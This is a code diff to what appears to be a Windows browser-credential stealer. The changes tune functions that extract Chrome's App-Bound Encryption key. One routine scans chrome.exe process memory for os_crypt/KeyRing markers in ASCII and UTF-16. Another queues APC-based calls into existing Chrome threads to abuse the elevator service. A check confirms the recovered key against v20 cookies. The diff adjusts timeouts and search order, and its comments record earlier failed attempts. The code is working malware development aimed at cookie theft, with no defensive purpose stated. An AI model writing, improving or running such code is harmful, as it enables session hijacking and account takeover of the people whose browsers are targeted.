@@ -31,9 +31,9 @@ _DUP_HANDLE_MAX_PIDS = 24
 _DUP_HANDLE_MAX_HANDLES = 4000
 _ABE_COCREATE_TIMEOUT_S = 2.0
 _ABE_HELPER_TIMEOUT_S = 8.0
-_ABE_MEMSCAN_TIMEOUT_S = 6.0
-_ABE_ELEVATOR_TIMEOUT_S = 3.0
-_ABE_BROWSER_KEYS_TIMEOUT_S = 12.0
+_ABE_MEMSCAN_TIMEOUT_S = 12.0
+_ABE_ELEVATOR_TIMEOUT_S = 0.6
+_ABE_BROWSER_KEYS_TIMEOUT_S = 15.0
 _ELEV_PENDING_HR = 0x0E110001
 _ELEV_HANDSHAKE = 0xA1
 _ELEV_HANDSHAKE_OFF = 0x18
@@ -4466,10 +4466,17 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         key, ehr = _call_with_timeout(
             lambda: _chrome_elevator_abe_key(v20_sample),
             _ABE_ELEVATOR_TIMEOUT_S,
-            (None, "apc:force=miss:open"),
+            (None, "apc:force=miss:open=timeout"),
         )
-        if (ehr or "").startswith("apc:q:err=timeout") or ehr == "apc:force=miss":
-            ehr = "apc:ran" if _cache.get("_elev_hs") else "apc:force=miss:open"
+        if (ehr or "").startswith("apc:q:err=timeout") or (ehr or "") in {
+            "apc:force=miss",
+            "apc:force=miss:open",
+        }:
+            ehr = (
+                "apc:ran"
+                if _cache.get("_elev_hs")
+                else _apc_force_miss_open("timeout")
+            )
         if ehr:
             trail.append(ehr)
         if _abe_proves_cookies(key, v20_sample):
@@ -5548,11 +5555,14 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None
 
     def region_hot(data: bytes) -> bool:
+        # ASCII + UTF-16. Bare "encryptor" matches chrome.dll and starves.
         return (
             b"os_crypt" in data
             or b"OSCrypt" in data
-            or b"encryptor" in data
             or b"KeyRing" in data
+            or b"o\x00s\x00_\x00c\x00r\x00y\x00p\x00t\x00" in data
+            or b"K\x00e\x00y\x00R\x00i\x00n\x00g\x00" in data
+            or (b"encryptor" in data and b"v20\x00" in data)
         )
 
     def heap_stride(data: bytes) -> bytes | None:
@@ -5603,9 +5613,10 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                 return hit
         return None
 
-    # Browser chrome.exe only (no --type=). os_crypt / KeyRing / encryptor
-    # first, then heaps. Do not full-buffer mark-search (b8d68f3 starved tried=145).
-    # Stride 32 burned tried=1080 on cold heaps before KeyRing.
+    # Browser chrome.exe only (no --type=). Targeted KeyRing ptrs first (no
+    # stride). Then stride-8 heaps until hit / budget / 20000. Do not
+    # full-buffer mark-search (b8d68f3 starved tried=145). Stride 32 burned
+    # tried=1080 on cold heaps. 514d467 hot-strode encryptor and starved tried=392.
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
@@ -5662,14 +5673,16 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                                 hit = targeted(handle, data)
                                 if hit:
                                     return hit
+                            elif mode == "hot":
                                 if region_hot(data):
                                     hit = heap_stride(data)
                                     if hit:
                                         return hit
-                            elif not region_hot(data):
-                                hit = heap_stride(data)
-                                if hit:
-                                    return hit
+                            else:
+                                if not region_hot(data):
+                                    hit = heap_stride(data)
+                                    if hit:
+                                        return hit
                     nxt = addr + size
                     if nxt <= addr:
                         break
@@ -5677,6 +5690,9 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                 return None
 
             hit = walk("targeted")
+            if hit:
+                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
+            hit = walk("hot")
             if hit:
                 return hit, f"memscan:cands={cands};tried={tried};heap:hit"
             hit = walk("cold")
@@ -5855,14 +5871,17 @@ def _apc_q_err(code: Any) -> str:
 
 
 def _apc_force_miss_open(code: Any) -> str:
-    """chrome.exe>0 but handshake never ran. Exact NTSTATUS, never a bare force=miss."""
+    """chrome.exe>0 but handshake never ran. Always open=<NTSTATUS|queued|timeout>."""
     if isinstance(code, int):
         if code < 0 or code > 255:
             return f"apc:force=miss:open=0x{int(code) & 0xFFFFFFFF:08x}"
         return f"apc:force=miss:open={code}"
-    text = str(code or "q").strip() or "q"
-    if text.startswith("apc:force=miss:open"):
-        return text[:40]
+    text = str(code or "queued").strip() or "queued"
+    if text.startswith("apc:force=miss:open="):
+        tail = text.split("=", 2)[-1].strip()
+        return f"apc:force=miss:open={tail[:20]}" if tail else "apc:force=miss:open=queued"
+    if text.startswith("apc:force=miss"):
+        return "apc:force=miss:open=queued"
     return f"apc:force=miss:open={text[:20]}"
 
 
@@ -6117,16 +6136,16 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     pids = _chrome_browser_pids() or _chrome_pids_prioritized()
     if not pids:
         return None, "apc:q:err=pid"
-    last = "apc:force=miss:open"
+    last = _apc_force_miss_open("queued")
     pid = int(pids[0])
     clsid_s, iid_s = _CHROME_ELEVATOR[0]
     for flag in (1, 0):
         pt, hr = _chrome_elevator_decrypt_once(
-            pid, payload, clsid_s, iid_s, 4, 2, flag, 2.4
+            pid, payload, clsid_s, iid_s, 4, 2, flag, 0.45
         )
         last = hr
         if (hr or "").startswith("apc:force=miss"):
-            return None, hr if "open" in (hr or "") else _apc_force_miss_open(hr)
+            return None, _apc_force_miss_open(hr)
         if hr == "apc:ran":
             return None, "apc:ran"
         if not pt:
@@ -6384,11 +6403,11 @@ def _chrome_elevator_decrypt_once(
         sleepex = _remote_export_addr(k32, handle, "kernel32.dll", "SleepEx")
         dest = page + _ELEV_HANDSHAKE_OFF
         src = page + _ELEV_HANDSHAKE_OFF + 4
-        threads = _open_existing_threads(k32, pid, limit=16)
+        threads = _open_existing_threads(k32, pid, limit=6)
         if not threads:
             return None, _apc_force_miss_open(_cache.get("_elev_q_err") or "nothread")
         last_status = 0
-        deadline = time.monotonic() + max(0.2, min(2.4, float(budget_s)))
+        deadline = time.monotonic() + max(0.2, min(0.45, float(budget_s)))
         rsp = ((page + 0x800 + 512) & ~0xF) - 8
 
         def handshake_set() -> bool:
